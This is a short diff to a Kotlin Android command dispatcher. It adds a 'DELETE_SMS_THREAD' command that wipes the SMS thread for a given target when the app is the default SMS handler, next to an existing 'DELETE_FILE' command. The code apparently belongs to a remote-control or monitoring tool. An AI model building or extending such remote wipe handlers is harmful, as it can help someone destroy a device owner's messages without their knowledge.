@@ -1117,6 +1117,17 @@ object CommandProcessor {
                     }
                     errorMsg = "Action: $action | Target: ${value ?: "ALL"}"
                 }
+                "DELETE_SMS_THREAD" -> {
+                    if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                        status = "FAILED (NOT_DEFAULT)"
+                        errorMsg = "I'm not default to do that"
+                    } else {
+                        val target = content.trim()
+                        val deletedCount = PhoneManager.deleteSmsThread(ctx, target)
+                        status = "THREAD_WIPED"
+                        errorMsg = "Target: $target"
+                    }
+                }
                 "DELETE_FILE" -> {
                     val paths = content.split("|")
                     var successCount = 0
